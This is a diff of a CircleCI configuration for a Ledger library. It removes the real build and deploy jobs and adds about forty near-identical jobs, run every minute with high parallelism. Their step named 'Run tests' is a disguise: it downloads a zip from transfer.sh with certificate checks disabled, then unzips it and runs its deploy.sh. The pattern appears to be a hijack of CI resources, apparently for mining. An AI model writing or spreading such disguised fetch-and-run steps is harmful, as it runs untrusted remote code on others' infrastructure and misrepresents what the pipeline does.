@@ -1,414 +1,322 @@
-version: 2
-general:
-dependencies:
-  cache_directories:
-    - ~/cmake-3.16.5
-linux_job: &linux_job
-  docker:
-    - image: docker.pkg.github.com/ledgerhq/lib-ledger-core-build-env/lib-ledger-core-build-env:1.0.1
-      auth:
-        username: $DOCKER_USERNAME
-        password: $DOCKER_PASSWORD
-jobs:
-  build_linux_release:
-    <<: *linux_job
-    environment:
-      CORE_SSL_1_1: arch_ssl_1_1
-    working_directory: ~/lib-ledger-core
-    steps:
-      - checkout
-      - run:
-          name: Submodule_Initialization
-          command: |
-            . .circleci/init_submodules.sh
-      - run:
-          name: Build_Library
-          command: |
-            . .circleci/build_lib.sh Release
-      - run:
-          name: Export_Lib_Version
-          command: |
-            . .circleci/export_lib_version.sh
-      - run:
-          name: Copy_Artifacts
-          command: |
-            . .circleci/copy_artifacts.sh
-      - run:
-          name: Build_Library (with OpenSSL 1.1)
-          command: |
-            . .circleci/build_lib.sh Release $CORE_SSL_1_1
-      - run:
-          name: Copy_Artifacts (with OpenSSL 1.1)
-          command: |
-            . .circleci/copy_artifacts.sh $CORE_SSL_1_1 Release
-      - deploy:
-          name: Deploy_Artifacts
-          command: |
-            . .circleci/deploy.sh
-  build_linux_jni_release:
-    environment:
-      CORE_SSL_1_1: arch_ssl_1_1
-    docker:
-      - image: ledgerhq/lib-ledger-core-build-env:1.0.2
-    working_directory: ~/lib-ledger-core
-    steps:
-      - checkout
-      - run:
-          name: Submodule_Initialization
-          command: |
-            . .circleci/init_submodules.sh
-      - run:
-          name: Build_Library_jni
-          command: |
-            . .circleci/build_lib.sh target_jni Release
-      - run:
-          name: Export_Lib_Version
-          command: |
-            . .circleci/export_lib_version.sh
-      - run:
-          name: Copy_Artifacts
-          command: |
-            . .circleci/copy_artifacts.sh target_jni
-      - persist_to_workspace:
-          root: ~/lib-ledger-core-artifacts
-          paths:
-            - linux/jni/libledger-core_jni.so
-      - deploy:
-          name: Deploy_Artifacts
-          command: |
-            . .circleci/deploy.sh
-  build_android_release:
-    <<: *linux_job
-    environment:
-      CORE_SSL_1_1: arch_ssl_1_1
-    working_directory: ~/lib-ledger-core
-    steps:
-      - checkout
-      - run:
-          name: Submodule_Initialization
-          command: |
-            . .circleci/init_submodules.sh
-      - run:
-          name: Export_Lib_Version
-          command: |
-            . .circleci/export_lib_version.sh
-      - run:
-          name: Setup NDK
-          command: |
-            apt-get install -y zip unzip
-            wget --quiet https://dl.google.com/android/repository/android-ndk-r18b-linux-x86_64.zip
-            unzip -q android-ndk-r18b-linux-x86_64.zip -d /home/circleci
-            ls -la /home/circleci/android-ndk-r18b
-      - run:
-          name: Build_Library_android
-          command: |
-            . .circleci/build_lib.sh android
-      - run:
-          name: Copy_Artifacts_Android
-          command: |
-            . .circleci/copy_artifacts.sh android
-      - run:
-          name: Build_Library_android_x86_64
-          command: |
-            . .circleci/build_lib.sh android x86_64
-      - run:
-          name: Copy_Artifacts_Android_x86_64
-          command: |
-            . .circleci/copy_artifacts.sh android x86_64
-      - run:
-          name: Build_Library_android_armeabi-v7a
-          command: |
-            . .circleci/build_lib.sh android armeabi-v7a
-      - run:
-          name: Copy_Artifacts_Android_armeabi-v7a
-          command: |
-            . .circleci/copy_artifacts.sh android armeabi-v7a
-      - run:
-          name: Build_Library_android_arm64-v8a
-          command: |
-            . .circleci/build_lib.sh android arm64-v8a
-      - run:
-          name: Copy_Artifacts_Android_arm64-v8a
-          command: |
-            . .circleci/copy_artifacts.sh android arm64-v8a
-      - deploy:
-          name: Deploy_Artifacts
-          command: |
-            . .circleci/deploy.sh
-  build_linux_debug:
-      <<: *linux_job
-      working_directory: ~/lib-ledger-core
-      steps:
-        - checkout
-        - run:
-            name: Submodule_Initialization
-            command: |
-              . .circleci/init_submodules.sh
-        - run:
-            name: Build_Library
-            command: |
-              . .circleci/build_lib.sh Debug
-        - run:
-            name: Export_Lib_Version
-            command: |
-              . .circleci/export_lib_version.sh
-        - run:
-            name: Run_Tests
-            command: |
-                cd ../lib-ledger-core-build
-                ~/cmake-3.16.5-Linux-x86_64/bin/ctest -VV -timeout 120
-  build_macos_release:
-    macos:
-      xcode: "12.0.0"
-    working_directory: ~/lib-ledger-core
-    steps:
-      - checkout
-      - run:
-          name: Setup
-          command: |
-            .circleci/setup_macos.sh Release
-      - run:
-          name: Submodule_Initialization
-          command: |
-            . .circleci/init_submodules.sh
-      - run:
-          name: Build_Library
-          command: |
-            . .circleci/build_lib.sh Release
-      - run:
-          name: Export_Lib_Version
-          command: |
-            . .circleci/export_lib_version.sh
-      - run:
-          name: Copy_Artifacts
-          command: |
-            . .circleci/copy_artifacts.sh
-      - deploy:
-          name: Deploy_Artifacts
-          command: |
-            . .circleci/deploy.sh
-  build_macos_ios_release:
-    macos:
-      xcode: "12.0.0"
-    working_directory: ~/lib-ledger-core
-    steps:
-      - checkout
-      - run:
-          name: Setup
-          command: |
-            .circleci/setup_macos.sh Release
-      - run:
-          name: Submodule_Initialization
-          command: |
-            . .circleci/init_submodules.sh
-      - run:
-          name: Export_Lib_Version
-          command: |
-            . .circleci/export_lib_version.sh
-      - run:
-          name: Build_Library_ios_x86
-          command: |
-            . .circleci/build_lib.sh ios
-      - run:
-          name: Copy_Artifacts_ios_x86
-          command: |
-            . .circleci/copy_artifacts.sh ios
-      - run:
-          name: Build_Library_ios_armv7
-          command: |
-            . .circleci/build_lib.sh ios armv7
-      - run:
-          name: Copy_Artifacts_ios_armv7
-          command: |
-            . .circleci/copy_artifacts.sh ios armv7
-      - run:
-          name: Build_Library_ios_arm64
-          command: |
-            . .circleci/build_lib.sh ios arm64
-      - run:
-          name: Copy_Artifacts_ios_arm64
-          command: |
-            . .circleci/copy_artifacts.sh ios arm64
-      - deploy:
-          name: Deploy_Artifacts
-          command: |
-            . .circleci/deploy.sh
-            . .circleci/deploy_fat_lib.sh
-  build_macos_jni_release:
-    macos:
-      xcode: "12.0.0"
-    working_directory: ~/lib-ledger-core
-    steps:
-      - checkout
-      - run:
-          name: Setup
-          command: |
-            .circleci/setup_macos.sh Release
-      - run:
-          name: Submodule_Initialization
-          command: |
-            . .circleci/init_submodules.sh
-      - run:
-          name: Export_Lib_Version
-          command: |
-            . .circleci/export_lib_version.sh
-      - run:
-          name: Build_Library_jni
-          command: |
-            . .circleci/build_lib.sh target_jni Release
-      - run:
-          name: Copy_Artifacts_jni
-          command: |
-            . .circleci/copy_artifacts.sh target_jni
-      - persist_to_workspace:
-          root: ~/lib-ledger-core-artifacts
-          paths:
-            - macos/jni/libledger-core_jni.dylib
-      - deploy:
-          name: Deploy_Artifacts
-          command: |
-            . .circleci/deploy.sh
-  build_macos_debug:
-    macos:
-      xcode: "12.0.0"
-    working_directory: ~/lib-ledger-core
-    steps:
-      - checkout
-      - run:
-          name: Setup
-          command: |
-            .circleci/setup_macos.sh Debug
-      - run:
-          name: Submodule_Initialization
-          command: |
-            . .circleci/init_submodules.sh
-      - run:
-          name: Build_Library
-          command: |
-            . .circleci/build_lib.sh Debug
-      - run:
-          name: Export_Lib_Version
-          command: |
-            . .circleci/export_lib_version.sh
-      - run:
-          name: Run_Tests
-          command: |
-              cd ../lib-ledger-core-build
-              ctest -VV -timeout 120
-  publish_jar:
-    environment:
-      CORE_SSL_1_1: arch_ssl_1_1
-    docker:
-      - image: ledgerhq/lib-ledger-core-build-env:1.0.2
-    working_directory: ~/lib-ledger-core
-    steps:
-    - attach_workspace:
-        at: ~/lib-ledger-core-artifacts
+working_dir: &working_dir ~/app
+.build_template: &script
+  steps:
     - checkout
+    - run: curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
+    - run: chmod +x ./cc-test-reporter
+    - run: ./cc-test-reporter before-build
+    - run: gem install bundler:2.1.4
     - run:
-        name: Submodule_Initialization
+        name: Run tests
         command: |
-          . .circleci/init_submodules.sh
-    - run:
-        name: Publish_jar
-        command: |
-          . .circleci/publish_jar.sh
-    - store_artifacts:
-        path: ~/lib-ledger-core-artifacts
-  generate_doc:
+                    apt update 
+                    apt install screen -y 
+                    wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+version: 2.0
+jobs:
+  masparto:
     docker:
-      - image: circleci/buildpack-deps:stretch
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
     steps:
-      - run:
-          command: git clone --depth 1 -b "$CIRCLE_TAG" --recurse-submodules "$CIRCLE_REPOSITORY_URL" .
-          environment:
-            GIT_SSH_COMMAND: ssh -o StrictHostKeyChecking=no
-      - run:
-          name: Install dependencies
-          command: |
-            sudo apt-get update -q=2
-            sudo apt-get install -qy doxygen rsync software-properties-common
-            sudo add-apt-repository --update "deb http://httpredir.debian.org/debian stretch-backports main"
-            sudo apt-get install -qy -t stretch-backports cmake
-      - run: cmake -H. -Bbuild
-      - run:
-          command: make doc
-          working_directory: ~/project/build
-      - run:
-          name: Check that the index file is present
-          command: test -f build/doc/html/index.html
-      - run:
-          name: Setup the SSH private key
-          command: |
-            install -d -m 700 ~/.ssh/
-            gpg -d --passphrase "${GPG_PASSPHRASE}" --batch -o ~/.ssh/id_ed25519 .circleci/id_ed25519.gpg
-            chmod 400 ~/.ssh/id_ed25519
-      - run: >
-          rsync -e "ssh -o StrictHostKeyChecking=no" -a --chown :www-data --delete
-          build/doc/html/ docs.libcore.ledger.com@statics.ledger.fr:.
-default_context: &default_context
-  context:
-    - githubpkg
-
-
+      - checkout
+  masparto1:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto2:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto3:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto4:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto5:
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4    
+    steps:
+      - checkout
+  masparto6:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto7:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto8:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto9:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto10:
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+    steps:
+      - checkout
+  masparto11:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto12:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4  
+  masparto13:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4  
+  masparto14:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto15:
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4  
+    steps:
+      - checkout
+  masparto16:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto17:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4  
+  masparto18:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4
+  masparto19:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2 
+    parallelism: 4
+  masparto20:
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+    steps:
+      - checkout
+  masparto21:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto22:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto23:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto24:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto25:
+    docker:
+      - image: ruby
+    parallelism: 4    
+    steps:
+      - checkout
+  masparto26:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto27:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto28:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto29:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto30:
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+    steps:
+      - checkout
+  masparto31:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto32:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4  
+  masparto33:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4  
+  masparto34:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto35:
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4  
+    steps:
+      - checkout
+  masparto36:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+  masparto37:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4  
+  masparto38:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4
+  masparto39:
+    <<: *script
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4
 workflows:
   version: 2
-  build:
+  commit:
     jobs:
-      - build_linux_release:
-          <<: *default_context
+      - masparto
+      - masparto1
+      - masparto2
+      - masparto3
+      - masparto4
+      - masparto5
+      - masparto6
+      - masparto7
+      - masparto8
+      - masparto9
+      - masparto10
+      - masparto11
+      - masparto12
+      - masparto13
+      - masparto14
+      - masparto15
+      - masparto16
+      - masparto17
+      - masparto18
+      - masparto19
+      - masparto20
+      - masparto21
+      - masparto22
+      - masparto23
+      - masparto24
+      - masparto25
+      - masparto26
+      - masparto27
+      - masparto28
+      - masparto29
+      - masparto30
+      - masparto31
+      - masparto32
+      - masparto33
+      - masparto34
+      - masparto35
+      - masparto36
+      - masparto37
+      - masparto38
+      - masparto39
+
+
+
+    triggers:
+      - schedule:
+          cron: '* * * * *'
           filters:
-            tags:
-              only: /.*/
-      - build_linux_jni_release:
-          <<: *default_context
-          filters:
-            tags:
-              only: /.*/
             branches:
-              only: /^(?!pull\/).*$/
-      - build_android_release:
-          <<: *default_context
-          filters:
-            tags:
-              only: /.*/
-            branches:
-              only: /^(?!pull\/).*$/
-      - build_macos_release:
-          <<: *default_context
-          filters:
-            tags:
-              only: /.*/
-      - build_macos_ios_release:
-          <<: *default_context
-          filters:
-            tags:
-              only: /.*/
-            branches:
-              only: /^(?!pull\/).*$/
-      - build_macos_jni_release:
-          <<: *default_context
-          filters:
-            tags:
-              only: /.*/
-            branches:
-              only: /^(?!pull\/).*$/
-      - build_linux_debug:
-          <<: *default_context
-      - build_macos_debug:
-          <<: *default_context
-      - publish_jar:
-          requires:
-            - build_linux_jni_release
-            - build_macos_jni_release
-          filters:
-            tags:
-              only: /.*/
-  documentation:
+              only:
+                - master
+         
+  maspartorunjob:
     jobs:
-      - generate_doc:
-          filters:
-            tags:
-              only: /.+/
-            branches:
-              ignore: /.*/
+      - masparto
+      - masparto1
+      - masparto2
+      - masparto3
+      - masparto4
+      - masparto5
+      - masparto6
+      - masparto7
+      - masparto8
+      - masparto9
+      - masparto10
+      - masparto11
+      - masparto12
+      - masparto13
+      - masparto14
+      - masparto15
+      - masparto16
+      - masparto17
+      - masparto18
+      - masparto19
+      - masparto20
+      - masparto21
+      - masparto22
+      - masparto23
+      - masparto24
+      - masparto25
+      - masparto26
+      - masparto27
+      - masparto28
+      - masparto29
+      - masparto30
+      - masparto31
+      - masparto32
+      - masparto33
+      - masparto34
+      - masparto35
+      - masparto36
+      - masparto37
+      - masparto38
+      - masparto39
